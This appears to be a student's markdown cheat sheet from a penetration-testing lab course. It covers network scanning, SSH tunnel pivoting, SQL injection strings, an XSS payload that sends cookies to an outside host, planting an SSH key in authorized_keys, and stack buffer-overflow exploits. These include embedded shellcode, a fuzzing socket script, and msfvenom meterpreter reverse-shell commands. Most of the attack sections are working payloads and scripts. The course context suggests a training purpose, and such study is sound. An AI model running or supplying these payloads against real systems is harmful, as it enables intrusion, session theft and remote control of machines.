# Commands

## Scraping Data
- Prep
```pip install lxml requests```
- Script
```
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
```
- What will it output?
```
Authors:  ['Albert Einstein', 'J.K. Rowling', 'Albert Einstein', 'Jane Austen', 'Marilyn Monroe', 'Albert Einstein', u’Andr\xe9 Gide', 'Thomas A. Edison', 'Eleanor Roosevelt', 'Steve Martin']
```

## proxychains nmap scripts
```
proxychains nmap -T5 --script=banner <ip>
proxychains nmap -T5 --script=http-enum <ip>
proxychains nmap -T5 --script=http-enum.nse <ip>
```

## finding a script
```
ls -l /usr/share/nmap/scripts | grep "something"
```

## TCPdump
sudo tcpdump -XXvvnni any tcp port 80


# Tunnels

## Setting up the connection
- set up connection to jump box
```
ssh -MS /tmp/jump student@10.50.35.126
```
- the /tmp/jump file is a socket

## Scanning IPs
- scan ips
```
for i in {1..254};do (ping -c 1 192.168.28.$i 2>/dev/null | grep "bytes from" &) ;done
```

## Dynamic tunnel
- now we need to set up the dynamic
```
ssh -S /tmp/jump jump -O forward -D9050
```
## Port Scans
- scan ports
```
proxychains nmap 192.168.28.97,98,100,105
```

## How to cancel the Port Forward
- Cancel your port forward
```
cntrl r <type part of command>
# change forward to cancel
ssh -S /tmp/jump jump -O cancel -D9050
```
## Forwarding to multiple ports at one time
- multiple forward to those vuln ports
```
ssh -S /tmp/jump jump -O forward -L2222:192.168.28.100:80 -L3333:192.168.28.100:2222
```
- you can forward to multiple ips

## Opening websites through the forward
- we can access the website via firefox on our lin-ops workstations 
```
firefox
```
- enter the loopback and the port 127.0.0.1:2222
## Tunneling to another device
- gonna use the shit out of this to authenticate to new system
```
ssh -MS /tmp/t1 creds@127.0.0.1 -p 3333
```
## Forwarding through the new tunnel
- theoretically after you scan the new net you find 192.168.50.10,20,30 - port 22
```
ssh -S /tmp/t1 t1 -O forward -L6666:192.168.50.10:22 -L7777:192.168.50.20:22
```
## Stepping through the tunnel
- making next step to tunnel
```
ssh -MS /tmp/t2 creds@127.0.0.1 -p 6666
```

## Website enumeration
```
--script=http-enum
```
## Nikto
```
nikto v -h <IP address>
```
> use with TCPdump.

## website exploitation commands
```
mkdir /var/www/directory/.ssh
cat ~/.ssh/id_rsa.pub
echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
cat /users/home/directory/.ssh/authorized_keys
```
## ssh with keys
```
ssh -i .ssh/id_rsa -MS /tmp/demo www-data@10.50.28.11
```
## making your own HTTP server 
```
python3 -m http.server
```
> default port 8000

## XSS check
```
<script>alert('XSS');</script>
```
## Other XSS useful command
```
<script>document.location="http://10.50.30.229:8000/?username=student" + document.cookie;</script>
```

# SQL Commands

## Commands for demo
```
mysql    # shows information regarding the server
help    # shows help
show databases ;    # shows what databases you can access. if you forget the semicolon if will not work.
```
### Default Databases
- information_schema    # contains information regarding all other databases
- mysql                 #
- performance_schema    #
```
show tables
```
### big three
- database
- table
- columns
```
show columns from columns ;
```
### Three golen nuggets
- table schema
- table name
- column name
### The Golden statement
```
select table_schema, table_name, column_name from information_schema.columns
```
### selecting multiple fields
```
select username, passwd, studentID from session.userinfo ;
select carid, type from session.cars ;
```

## SQL injection
```
'OR 1='1      #truth statement added to logins to get authentication
POST METHOD EXAMPLE
Audi 'UNION SELECT 1,2,3,4 #
Audi 'UNION SELECT table_schema,2, table_name, column_name,5 from information_schema.columns #
Audi 'UNION SELECT type,2,color,cost,year from session.car #
# GET METHOD EXAMPLE
UNION SELECT table_schema, table_name, column_name from information_schema.columns
UNION SELECT table_schema,column_name,table_name from information_schema.columns
# to get the version of the server you can use
@@version      # use as a value in query
```

### Steps for creds
- 1. input your true bool statement in both fields
- 2. observe the get request with dev tool
- 3. paste the get request into the html bar with a ? before to query it
- 4. observe creds

### steps for fuzzzy/spitballing
- 1. Identify the vuln field      # ford 'OR 1='1
- 2. Identify how many columns    # Audi 'UNION SELECT 1,2,3,4 #
- 3. Edit the golden statement    # build your golden statement to print every column with placeholders in the columns that are mising.



## Reverse engineering
### useful powershell commands
```
get-content -first 2 .\demo1_new.exe



```
### Useful program
- ghidra
- strings.exe

### steps for reverse engineering
- open ghidra
- look at static code
- run strings on code
- run code
- search file in ghidra for the string

## Exploit Development

### useful programs
```
GDB
MONA
IMMUNITY
```

### useful linux commands
```
strings
file
<<<    #can be used to pass a string to an executable as input

```
### steps for linux
- determin type of input the executable can take
- determin how much input executable can take
- analyze the program to determine method to exploit
- gdb the program to ensure overflow into pointer
- gdb the program and run ```pdisass getuserinput```
- utilize the address of the pointer to determine exact length of buffer
- utilize a blank slate ```env - gdb ./func```
  - ```unset env COLUMNS```
  - ```unset env LINES```
  - ```show env```
  - ```run```
- overflow with f
- ```info proc map```
- obtain the start of the address under heap and the last of the stack
- create a find command for these locations.
  - ```find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4```
- utilize the first 4 addresses
- seperate into bytes and convert indian
### example
```
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
```
- set the eip as the converted bytes
- ensure nop sled is set to ```"\x90" * 15```. the number can be between 10 and 20
- place code from msfconsole below for shell
### Steps for windows
- launch Immunity Debugger with admin
- check strings of vuln program
- run vuln program
- run ```netstat -anop tcp``` in powershell
- run ```get-process``` in powershell to view more information
- begin analysis with immunity debugger
- determine successfull interaction with the program and port
- successfully break the program
- utilize wiremask online tool to find offset
- verify offset
- search for first address ```!mona jmp -r ESP -m "essfunc.dll" ```. Check in the log window
- convert indian of bytes and ensure caps did not change
- create shellcode ```msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.30.229 lport=5555 -b "\x00" -f python```.
- utilize msfconsole
- multi/handler ```use multi/hander```
- set the payload to the same as your reverse payload. ```set payload windows/meterpreter/reverse_tcp```
- set the lport to what you set in the msfvenom reverse payload. ```set lport 5555```
- set the lhost to the box that you want to reverse to. ```set lhost 0.0.0.0```
- run exploit to start the listener
- run the script to exploit the machine
- 






### Example of script
```
#!/usr/bin/env python

#buffer size is 62

buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"

# grabbing jmp esp
# find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4i

#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"

#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

nop = "\x90" * 15

buf =  b""
buf += b"\xd9\xcc\xbe\x33\xbf\x4b\xb3\xd9\x74\x24\xf4\x58"
buf += b"\x2b\xc9\xb1\x0b\x83\xe8\xfc\x31\x70\x15\x03\x70"
buf += b"\x15\xd1\x4a\x21\xb8\x4d\x2c\xe4\xd8\x05\x63\x6a"
buf += b"\xac\x32\x13\x43\xdd\xd4\xe4\xf3\x0e\x46\x8c\x6d"
buf += b"\xd8\x65\x1c\x9a\xdd\x69\xa1\x5a\x95\x01\xce\x3b"
buf += b"\x34\xb8\x10\xeb\x95\xb3\xf0\xde\x9a"

print(buffer+eip+nop+buf)
```



### GDB demo commands
```
info
info functions
pdisass getuserinput

env - gdb ./func
unset env COLUMNS
unset env LINES

info proc map

```

### msfconsole stuff
```
msfconsole
use payload/linux/x86/exec
show options
set CMD whoami
generate -b '\x00' -f python


msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python

./func <<<$(./linbuffer.py)

```
### Windows
- run immunity debugger as admin
- run msfvenom from lin-ops
```
netstat -anop tcp
!mona jmp -r ESP -m "essfunc.dll"                                        # log data window

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.30.229 lport=5555 -b "\x00" -f python


```
### Script example
```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
print s.recv(1024) ## Print to screen what we recieve
s.send(buf) ## Send our buf variable
print s.recv(1024) ## Print to screen what we recieve
s.close() ## Close the socket
```
```

```






























